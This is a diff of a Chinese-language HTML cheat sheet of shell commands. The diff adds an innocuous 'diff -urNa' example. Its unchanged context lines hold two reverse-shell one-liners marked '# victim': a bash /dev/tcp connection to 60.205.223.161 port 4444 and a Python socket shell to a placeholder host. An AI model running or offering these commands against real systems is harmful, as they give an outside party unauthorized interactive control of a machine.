@@ -221,6 +221,8 @@ sed -i <span style="color:#d14">&#39;s/route/router/g&#39;</span> file.txt  <spa
 
 bash -i &gt;&amp; /dev/tcp/60.205.223.161/4444 0&gt;&amp;<span style="color:#099">1</span> <span style="color:#998;font-style:italic"># victim</span>
 python3 -c <span style="color:#d14">&#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;{ip}&#39;,{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&#34;</span> <span style="color:#998;font-style:italic"># victim</span>
+</code></pre></div><p>对比两个文件不同</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">diff -urNa dir1 dir2
 </code></pre></div><blockquote>
 <p>使用zsh运行bash命令可能会失败，可先切换到bash。mac下nc会报<code> missing port with option -l</code>错误，去掉参数p即可</p>
 </blockquote>
